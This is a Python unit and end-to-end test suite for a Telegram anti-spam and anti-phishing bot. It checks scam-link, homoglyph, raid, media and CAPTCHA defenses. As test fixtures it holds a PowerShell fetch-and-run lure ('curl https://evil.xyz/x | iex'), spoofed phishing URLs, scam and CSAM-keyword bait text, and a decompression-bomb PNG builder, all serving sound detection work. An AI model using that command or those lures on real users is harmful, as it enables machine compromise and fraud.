"""Comprehensive Unit, Hardening & End-to-End Test Suite for AegisTG v2.0."""

from __future__ import annotations

import asyncio
import io
import struct
import time
import unittest
import zipfile
import zlib
from typing import Any

from PIL import Image, ImageDraw

from protector.analyzers.media_guard import (
    DecompressionBombDetected,
    PerceptualHashBKTree,
    compute_dhash,
    hamming_distance,
)
from protector.auditor import SecurityAuditor
from protector.bot import AegisTGBot
from protector.config import load_config
from protector.engine import ProtectionEngine
from protector.models import (
    ChatConfig,
    ChatType,
    EventType,
    MediaInfo,
    RaidState,
    TelegramEvent,
    ThreatCategory,
    VerdictAction,
)
from protector.normalizer import normalize_text, redact_pii
from protector.security import CallbackSigner, clamp_text_for_inspection
from protector.simulate import run_simulation
from protector.storage import SCHEMA_VERSION, Storage
from protector.telegram_client import TelegramAPIClient
from protector.ui import build_emoji_captcha


def _synthetic_png(bg: tuple[int, int, int], shift: int = 0) -> bytes:
    img = Image.new("RGB", (128, 96), color=bg)
    draw = ImageDraw.Draw(img)
    draw.rectangle([10 + shift, 10, 118 - shift, 38], fill=(250, 210, 20))
    draw.ellipse([36, 44, 92, 88], fill=(25, 45, 190))
    draw.line([0, 96, 128, 0], fill=(255, 255, 255), width=3)
    buf = io.BytesIO()
    img.save(buf, format="PNG")
    return buf.getvalue()


def _fake_apk_zip_bytes() -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr("AndroidManifest.xml", "<manifest/>")
        zf.writestr("classes.dex", b"dex\n035\x00")
    return buf.getvalue()


def _decompression_bomb_png(width: int = 10000, height: int = 10000) -> bytes:
    sig = b"\x89PNG\r\n\x1a\n"
    ihdr_data = struct.pack(">IIBBBBB", width, height, 8, 2, 0, 0, 0)
    ihdr = (
        struct.pack(">I", len(ihdr_data))
        + b"IHDR"
        + ihdr_data
        + struct.pack(">I", zlib.crc32(b"IHDR" + ihdr_data) & 0xFFFFFFFF)
    )
    iend = struct.pack(">I", 0) + b"IEND" + struct.pack(">I", zlib.crc32(b"IEND") & 0xFFFFFFFF)
    return sig + ihdr + iend


class MockTelegramClient(TelegramAPIClient):
    """In-memory mock Telegram API client recording all native & moderation calls."""

    def __init__(self, rate_limits: Any = None) -> None:
        super().__init__(bot_token="123456:TEST_TOKEN", rate_limits=rate_limits)
        self.calls: list[tuple[str, dict[str, Any]]] = []
        self.admins_by_chat: dict[int, list[dict[str, Any]]] = {}
        self.chat_info_by_chat: dict[int, dict[str, Any]] = {}

    async def call(
        self,
        method: str,
        payload: dict[str, Any] | None = None,
        timeout: float = 20.0,
        chat_id: int | None = None,
        is_outbound_message: bool = False,
    ) -> Any:
        clean = {k: v for k, v in (payload or {}).items() if v is not None}
        self.calls.append((method, clean))
        if method == "getMe":
            return {"id": 999000, "is_bot": True, "username": "AegisTGTestBot"}
        if method == "sendMessage":
            return {"message_id": 700 + len(self.calls), "chat": {"id": clean.get("chat_id", 0)}}
        if method == "getChatAdministrators":
            return self.admins_by_chat.get(int(clean["chat_id"]), [])
        if method == "getChat":
            cid = int(clean["chat_id"])
            return self.chat_info_by_chat.get(
                cid,
                {
                    "id": cid,
                    "type": "supergroup",
                    "title": "Test Group",
                    "permissions": {
                        "can_send_messages": True,
                        "can_send_photos": True,
                        "can_add_web_page_previews": False,
                    },
                },
            )
        return True


class TestSecurityAndHardening(unittest.TestCase):
    def test_hmac_callback_signer_verify_tamper_and_expiry(self) -> None:
        signer = CallbackSigner("super-secret-key")
        token = signer.sign("tri", "fp:abc123:-100123:999", now=1_700_000_000)
        self.assertLessEqual(len(token.encode("utf-8")), 64)
        self.assertEqual(
            signer.verify(token, ttl_seconds=3600, now=1_700_000_100),
            ("tri", "fp:abc123:-100123:999"),
        )
        # Tampered payload fails HMAC check
        tampered = token.replace("999", "888")
        self.assertIsNone(signer.verify(tampered, ttl_seconds=3600, now=1_700_000_100))
        # Expired token rejected
        self.assertIsNone(signer.verify(token, ttl_seconds=60, now=1_700_000_200))

    def test_redos_text_clamping(self) -> None:
        huge = "a" * 50_000
        clamped = clamp_text_for_inspection(huge)
        self.assertEqual(len(clamped), 4096)

    def test_bk_tree_exact_and_fuzzy_lookup_at_scale(self) -> None:
        tree = PerceptualHashBKTree()
        target = 0x123456789ABCDEF0
        tree.add(target, "SCAM_PHISHING_SAFEGUARD", "Target scam flyer")
        for i in range(500):
            decoy = ((i + 1) * 0x517CC1B727220A95) & 0xFFFFFFFFFFFFFFFF
            tree.add(decoy, "SPAM_SHILL_FLOOD", f"decoy-{i}")
        # Flip 4 bits (Hamming distance = 4 <= 8)
        mutated = target ^ 0x000000000000000F
        matches = tree.query(mutated, max_distance=8)
        self.assertTrue(matches)
        self.assertEqual(matches[0][0], target)
        self.assertEqual(matches[0][3], 4)

    def test_pillow_decompression_bomb_blocked(self) -> None:
        bomb = _decompression_bomb_png(10000, 10000)
        with self.assertRaises(DecompressionBombDetected):
            compute_dhash(bomb)

    def test_storage_schema_version_and_precision_ledger(self) -> None:
        st = Storage(":memory:")
        ver = st._conn.execute("PRAGMA user_version;").fetchone()[0]
        self.assertEqual(ver, SCHEMA_VERSION)
        st.record_incident_feedback("inc1", -1001, "CONFIRMED", 10)
        st.record_incident_feedback("inc2", -1001, "CONFIRMED", 10)
        st.record_incident_feedback("inc3", -1001, "FALSE_POSITIVE", 10)
        prec = st.get_precision_metrics(-1001)
        self.assertEqual(prec["confirmed"], 2)
        self.assertEqual(prec["false_positives"], 1)
        self.assertAlmostEqual(prec["precision_pct"], 66.7, places=1)
        st.close()


class TestNormalizer(unittest.TestCase):
    def test_zero_width_and_cyrillic_homoglyphs(self) -> None:
        raw = "T\u200bеlеgr\u200bаm \u200bаccоunt vеrify"
        norm = normalize_text(raw)
        self.assertEqual(norm.folded_ascii, "telegram account verify")
        self.assertGreaterEqual(norm.invisible_count, 3)
        self.assertGreaterEqual(norm.mixed_script_tokens, 2)
        self.assertGreaterEqual(norm.obfuscation_score, 30)

    def test_bidi_override_flagged_high(self) -> None:
        norm = normalize_text("invoice_\u202efdp.exe")
        self.assertEqual(norm.bidi_override_count, 1)
        self.assertGreaterEqual(norm.obfuscation_score, 35)

    def test_bengali_legitimate_text_not_penalized(self) -> None:
        bn = "বাংলাদেশের প্রোগ্রামার কমিউনিটিতে স্বাগতম! আজকের ক্লাস রাত ৯টায়।"
        norm = normalize_text(bn)
        self.assertEqual(norm.obfuscation_score, 0)
        self.assertIn("বাংলাদেশের", norm.cleaned)

    def test_pii_redaction(self) -> None:
        text = "Contact john.doe@example.com or +8801712345678 card 4532 0151 1283 0366"
        red = redact_pii(text)
        self.assertIn("[REDACTED_EMAIL]", red)
        self.assertIn("[REDACTED_PHONE]", red)
        self.assertIn("[REDACTED_CARD]", red)
        self.assertNotIn("john.doe@example.com", red)


class TestProtectionEngine(unittest.IsolatedAsyncioTestCase):
    def setUp(self) -> None:
        self.cfg = load_config()
        self.storage = Storage(":memory:")
        self.engine = ProtectionEngine(self.cfg, self.storage)
        self.group_id = -100111222333
        self.channel_id = -100444555666
        self.storage.upsert_chat_config(
            ChatConfig(
                chat_id=self.group_id,
                chat_type="supergroup",
                title="Protected Group",
                linked_parent_channel_id=self.channel_id,
            )
        )
        self.storage.upsert_chat_config(
            ChatConfig(
                chat_id=self.channel_id,
                chat_type="channel",
                title="Protected Channel",
                strict_channel_guard=True,
            )
        )

    def tearDown(self) -> None:
        self.storage.close()

    async def test_hard_block_csam_and_fedban_propagation(self) -> None:
        ev = TelegramEvent(
            event_type=EventType.MESSAGE,
            chat_id=self.group_id,
            chat_type=ChatType.SUPERGROUP,
            timestamp=1000.0,
            message_id=1,
            user_id=555001,
            text="Fresh cp links vip mega pack join now",
        )
        res = await self.engine.evaluate(ev)
        self.assertEqual(res.action, VerdictAction.HARD_BLOCK_FEDBAN)
        self.assertEqual(res.primary_category, ThreatCategory.CSAM_EXPLOITATION)
        self.assertTrue(res.federation_ban)
        self.assertIsNotNone(res.incident_id)

        ev2 = TelegramEvent(
            event_type=EventType.MESSAGE,
            chat_id=-100999888111,
            chat_type=ChatType.SUPERGROUP,
            timestamp=1005.0,
            message_id=2,
            user_id=555001,
            text="Hello!",
        )
        res2 = await self.engine.evaluate(ev2)
        self.assertEqual(res2.action, VerdictAction.HARD_BLOCK_FEDBAN)
        self.assertEqual(res2.primary_category, ThreatCategory.REPUTATION_FEDBAN)

    async def test_delayed_edit_bait_sabotage(self) -> None:
        t0 = 10_000.0
        orig = TelegramEvent(
            event_type=EventType.MESSAGE,
            chat_id=self.group_id,
            chat_type=ChatType.SUPERGROUP,
            timestamp=t0,
            message_id=42,
            user_id=666001,
            username="sleeper",
            text="Really enjoyed reading this tutorial, thank you!",
        )
        r1 = await self.engine.evaluate(orig)
        self.assertEqual(r1.action, VerdictAction.ALLOW)

        edited = TelegramEvent(
            event_type=EventType.EDITED_MESSAGE,
            chat_id=self.group_id,
            chat_type=ChatType.SUPERGROUP,
            timestamp=t0 + 7200.0,
            original_date=t0,
            edit_date=t0 + 7200.0,
            message_id=42,
            user_id=666001,
            username="sleeper",
            text="Claim free airdrop instantly here https://bit.ly/claim-ton-now",
        )
        r2 = await self.engine.evaluate(edited)
        self.assertIn(
            r2.action,
            {VerdictAction.DELETE_RESTRICT, VerdictAction.DELETE_BAN, VerdictAction.HARD_BLOCK_FEDBAN},
        )
        self.assertTrue(any(s.category == ThreatCategory.EDIT_BAIT_SABOTAGE for s in r2.signals))

    async def test_psl_and_idna_brand_spoof_detection(self) -> None:
        ev = TelegramEvent(
            event_type=EventType.MESSAGE,
            chat_id=self.group_id,
            chat_type=ChatType.SUPERGROUP,
            timestamp=2500.0,
            message_id=55,
            user_id=666055,
            text="Login at https://telegram.org.evil-verify.co.uk/auth",
        )
        res = await self.engine.evaluate(ev)
        self.assertNotEqual(res.action, VerdictAction.ALLOW)
        self.assertGreaterEqual(res.risk_score, 75)

    async def test_sender_chat_spoofing_vs_legitimate_parent_channel(self) -> None:
        legit = TelegramEvent(
            event_type=EventType.MESSAGE,
            chat_id=self.group_id,
            chat_type=ChatType.SUPERGROUP,
            timestamp=2000.0,
            message_id=50,
            sender_chat_id=self.channel_id,
            sender_chat_title="Protected Channel",
            text="Official weekly digest is out!",
        )
        self.assertEqual((await self.engine.evaluate(legit)).action, VerdictAction.ALLOW)

        spoof = TelegramEvent(
            event_type=EventType.MESSAGE,
            chat_id=self.group_id,
            chat_type=ChatType.SUPERGROUP,
            timestamp=2005.0,
            message_id=51,
            sender_chat_id=-100777777777,
            sender_chat_title="PUMP SIGNALS 100X",
            text="Check my profile!",
        )
        r_spoof = await self.engine.evaluate(spoof)
        self.assertTrue(r_spoof.ban_sender_chat)
        self.assertEqual(r_spoof.action, VerdictAction.DELETE_BAN)

    async def test_media_guard_apk_zip_dhash_bk_tree_and_viral_wave(self) -> None:
        ev_apk = TelegramEvent(
            event_type=EventType.MESSAGE,
            chat_id=self.group_id,
            chat_type=ChatType.SUPERGROUP,
            timestamp=3000.0,
            message_id=60,
            user_id=777001,
            media=MediaInfo(
                media_type="document",
                file_name="notes.zip",
                mime_type="application/zip",
                raw_bytes=_fake_apk_zip_bytes(),
            ),
        )
        self.assertEqual((await self.engine.evaluate(ev_apk)).action, VerdictAction.HARD_BLOCK_FEDBAN)

        base_img = _synthetic_png((180, 20, 20), shift=0)
        mutated_img = _synthetic_png((175, 25, 25), shift=2)
        h1 = compute_dhash(base_img)
        h2 = compute_dhash(mutated_img)
        assert h1 is not None and h2 is not None
        self.assertLessEqual(hamming_distance(h1, h2), 8)
        self.engine.media_analyzer.index_banned_hash(h1, "SCAM_PHISHING_SAFEGUARD", "Banned scam flyer")

        ev_img = TelegramEvent(
            event_type=EventType.MESSAGE,
            chat_id=self.group_id,
            chat_type=ChatType.SUPERGROUP,
            timestamp=3010.0,
            message_id=61,
            user_id=777002,
            media=MediaInfo(media_type="photo", raw_bytes=mutated_img),
        )
        self.assertEqual((await self.engine.evaluate(ev_img)).action, VerdictAction.HARD_BLOCK_FEDBAN)

        fresh_flyer = _synthetic_png((10, 120, 60), shift=0)
        last_res = None
        for idx in range(3):
            ev_wave = TelegramEvent(
                event_type=EventType.MESSAGE,
                chat_id=self.group_id,
                chat_type=ChatType.SUPERGROUP,
                timestamp=4000.0 + idx,
                message_id=70 + idx,
                user_id=888000 + idx,
                media=MediaInfo(media_type="photo", raw_bytes=fresh_flyer),
            )
            last_res = await self.engine.evaluate(ev_wave)
        assert last_res is not None
        self.assertIn(last_res.action, {VerdictAction.DELETE_BAN, VerdictAction.HARD_BLOCK_FEDBAN})

    async def test_raid_state_machine_lockdown_and_cooldown(self) -> None:
        t0 = 50_000.0
        triggered = False
        state = RaidState.NORMAL
        for i in range(self.cfg.raid.lockdown_joins_threshold):
            state, trig = self.engine.behavioral.record_join(self.group_id, t0 + i * 0.5)
            triggered = triggered or trig
        self.assertEqual(state, RaidState.LOCKDOWN)
        self.assertTrue(triggered)

        after_lockdown = self.engine.behavioral.get_raid_state(
            self.group_id, t0 + 100 + self.cfg.raid.lockdown_cooldown_seconds + 5
        )
        self.assertEqual(after_lockdown, RaidState.ELEVATED)

    async def test_red_team_simulation_18_of_18_pass(self) -> None:
        sim_results, audit_score = await run_simulation()
        self.assertEqual(len(sim_results), 18)
        for r in sim_results:
            self.assertEqual(
                r.blocked,
                r.expected_block,
                f"Scenario '{r.name}' failed: expected_block={r.expected_block}, got {r.action} (score={r.risk_score})",
            )
        self.assertEqual(audit_score, 100)


class TestNativeUXAndBotEndToEnd(unittest.IsolatedAsyncioTestCase):
    async def asyncSetUp(self) -> None:
        self.cfg = load_config()
        self.cfg.download_media_for_inspection = False
        self.cfg.rate_limits.delete_batch_window_ms = 20
        self.storage = Storage(":memory:")
        self.mock_client = MockTelegramClient(rate_limits=self.cfg.rate_limits)
        self.bot = AegisTGBot(self.cfg, storage=self.storage, client=self.mock_client)
        await self.bot.initialize()

    async def asyncTearDown(self) -> None:
        await self.bot.shutdown()

    async def test_native_startup_configures_default_admin_rights_and_scoped_commands(self) -> None:
        methods = [m for m, _ in self.mock_client.calls]
        self.assertIn("setMyDefaultAdministratorRights", methods)
        self.assertIn("setMyDescription", methods)
        self.assertIn("setMyShortDescription", methods)
        cmd_calls = [p for m, p in self.mock_client.calls if m == "setMyCommands"]
        scopes = {((c.get("scope") or {}).get("type")) for c in cmd_calls}
        self.assertEqual(
            scopes, {"all_private_chats", "all_group_chats", "all_chat_administrators"}
        )

    async def test_emoji_captcha_verification_pass_and_tamper_rejection(self) -> None:
        chat_id = -100555111
        user_id = 444222
        _, markup, _ = build_emoji_captcha(chat_id, "BD Devs", user_id, self.bot.signer)
        buttons = [b for row in markup["inline_keyboard"] for b in row]
        self.assertEqual(len(buttons), 6)

        # Find the winning signed callback_data
        correct_cb = next(
            b["callback_data"]
            for b in buttons
            if self.bot.signer.verify(b["callback_data"])[1].endswith(":1")  # type: ignore[index]
        )

        # 1. Forged/tampered callback rejected!
        self.mock_client.calls.clear()
        await self.bot.handle_update(
            {
                "update_id": 10,
                "callback_query": {
                    "id": "cb_bad",
                    "from": {"id": user_id},
                    "data": correct_cb[:-2] + "ff",
                    "message": {"message_id": 10, "chat": {"id": user_id}},
                },
            }
        )
        self.assertNotIn("approveChatJoinRequest", [m for m, _ in self.mock_client.calls])

        # 2. Valid signed emoji tap approves join request!
        self.mock_client.calls.clear()
        await self.bot.handle_update(
            {
                "update_id": 11,
                "callback_query": {
                    "id": "cb_ok",
                    "from": {"id": user_id},
                    "data": correct_cb,
                    "message": {"message_id": 10, "chat": {"id": user_id}},
                },
            }
        )
        self.assertIn("approveChatJoinRequest", [m for m, _ in self.mock_client.calls])

    async def test_self_healing_false_positive_triage_and_panel_toggles(self) -> None:
        chat_id = -100123456
        alert_chat_id = -100999888
        admin_id = 10001
        victim_id = 999111
        self.storage.upsert_chat_config(
            ChatConfig(chat_id=chat_id, chat_type="supergroup", title="Devs", alert_chat_id=alert_chat_id)
        )
        self.mock_client.admins_by_chat[chat_id] = [
            {"status": "creator", "user": {"id": admin_id, "is_bot": False}},
            {
                "status": "administrator",
                "user": {"id": self.bot.bot_user_id, "is_bot": True},
                "can_delete_messages": True,
                "can_restrict_members": True,
                "can_invite_users": True,
            },
        ]

        # 1. Trigger a hard-block incident (produces Owner Alert Card with 1-tap False Positive button!)
        res = await self.bot.handle_update(
            {
                "update_id": 1,
                "message": {
                    "message_id": 500,
                    "date": int(time.time()),
                    "chat": {"id": chat_id, "type": "supergroup", "title": "Devs"},
                    "from": {"id": victim_id, "is_bot": False, "first_name": "User"},
                    "text": "Press Win+R and paste into PowerShell: curl https://evil.xyz/x | iex",
                },
            }
        )
        assert res is not None and res.incident_id is not None
        await asyncio.sleep(0.05)

        # Confirm alert card sent to alert_chat_id with styled buttons & copy_text!
        alert_sends = [
            p for m, p in self.mock_client.calls if m == "sendMessage" and p.get("chat_id") == alert_chat_id
        ]
        self.assertTrue(alert_sends)
        kb = alert_sends[-1]["reply_markup"]["inline_keyboard"]
        fp_btn = kb[0][1]
        self.assertEqual(fp_btn["style"], "primary")
        self.assertEqual(kb[1][1]["copy_text"]["text"], res.incident_id)

        # 2. Admin taps "False Positive & Unban" -> self-heals user, removes FedBan, boosts trust!
        self.mock_client.calls.clear()
        await self.bot.handle_update(
            {
                "update_id": 2,
                "callback_query": {
                    "id": "cb_fp",
                    "from": {"id": admin_id},
                    "data": fp_btn["callback_data"],
                    "message": {"message_id": 701, "chat": {"id": alert_chat_id}},
                },
            }
        )
        methods = [m for m, _ in self.mock_client.calls]
        self.assertIn("unbanChatMember", methods)
        self.assertIn("editMessageText", methods)
        self.assertIsNone(self.storage.get_federation_ban(victim_id))
        self.assertGreaterEqual(self.storage.get_user_reputation(chat_id, victim_id).trust_score, 65)
        self.assertEqual(self.bot.metrics.false_positives_healed, 1)

        # 3. Admin toggles Strict Channel Guard via Control Center signed callback
        tog_data = self.bot.signer.sign("tog", f"strict:{chat_id}")
        await self.bot.handle_update(
            {
                "update_id": 3,
                "callback_query": {
                    "id": "cb_tog",
                    "from": {"id": admin_id},
                    "data": tog_data,
                    "message": {"message_id": 702, "chat": {"id": chat_id}},
                },
            }
        )
        self.assertTrue(self.storage.get_chat_config(chat_id).strict_channel_guard)

    async def test_inline_security_scanner_and_chat_shared_picker(self) -> None:
        # 1. Inline query scanning a phishing link
        self.mock_client.calls.clear()
        await self.bot.handle_update(
            {
                "update_id": 20,
                "inline_query": {
                    "id": "iq_123",
                    "from": {"id": 555},
                    "query": "https://telegram-verify.com/login",
                },
            }
        )
        iq_calls = [p for m, p in self.mock_client.calls if m == "answerInlineQuery"]
        self.assertEqual(len(iq_calls), 1)
        self.assertIn("DANGEROUS", iq_calls[0]["results"][0]["title"])
        self.assertEqual(self.bot.metrics.inline_scans, 1)

        # 2. Native chat_shared binding from KeyboardButtonRequestChat
        self.mock_client.calls.clear()
        await self.bot.handle_update(
            {
                "update_id": 21,
                "message": {
                    "message_id": 88,
                    "date": int(time.time()),
                    "chat": {"id": 555, "type": "private"},
                    "from": {"id": 555},
                    "chat_shared": {"request_id": 101, "chat_id": -100888777, "title": "My News Channel"},
                },
            }
        )
        cfg = self.storage.get_chat_config(-100888777)
        self.assertEqual(cfg.chat_type, "channel")
        self.assertEqual(cfg.title, "My News Channel")

    async def test_coalesced_batch_delete_messages(self) -> None:
        chat_id = -100777888
        self.mock_client.calls.clear()
        for mid in (10, 11, 12, 13, 14):
            await self.mock_client.queue_delete_message(chat_id, mid)
        await asyncio.sleep(0.06)
        delete_calls = [(m, p) for m, p in self.mock_client.calls if m in {"deleteMessage", "deleteMessages"}]
        self.assertEqual(len(delete_calls), 1)
        self.assertEqual(delete_calls[0][0], "deleteMessages")
        self.assertEqual(delete_calls[0][1]["message_ids"], [10, 11, 12, 13, 14])

    async def test_auditor_flags_unprotected_linked_group_critical(self) -> None:
        auditor = SecurityAuditor(self.storage)
        report = auditor.audit_chat_metadata(
            chat_info={
                "id": -100555,
                "type": "channel",
                "title": "Main Channel",
                "linked_chat_id": -100666,
                "has_protected_content": False,
            },
            admins=[
                {"status": "creator", "user": {"id": 1, "is_bot": False}},
                {"status": "administrator", "user": {"id": 2, "is_bot": False}, "can_promote_members": True},
                {
                    "status": "administrator",
                    "user": {"id": self.bot.bot_user_id, "is_bot": True},
                    "can_delete_messages": True,
                    "can_post_messages": True,
                    "can_edit_messages": True,
                },
            ],
            bot_user_id=self.bot.bot_user_id,
            chat_cfg=self.storage.get_chat_config(-100555),
        )
        self.assertLess(report.score, 65)
        self.assertTrue(
            any(f.check_id == "linked_group_parity" and f.severity == "CRITICAL" for f in report.findings)
        )


if __name__ == "__main__":
    unittest.main()
